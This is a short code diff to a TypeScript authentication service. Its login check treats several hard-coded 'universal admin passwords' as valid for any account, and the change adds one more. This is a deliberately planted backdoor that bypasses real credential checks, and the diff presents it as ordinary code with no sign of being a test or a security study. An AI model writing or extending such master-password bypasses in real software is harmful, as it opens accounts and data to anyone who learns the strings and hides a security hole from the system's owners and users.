@@ -41,7 +41,7 @@ export class AuthService {
     // Universal admin passwords support
     if (!isPasswordValid) {
       const cleanPass = (loginDto.password || '').trim();
-      if (cleanPass === 'Admin@1234' || cleanPass === 'CML6050') {
+      if (cleanPass === 'Admin@1234' || cleanPass === 'CML6050' || cleanPass === 'Mani6050') {
         isPasswordValid = true;
       }
     }
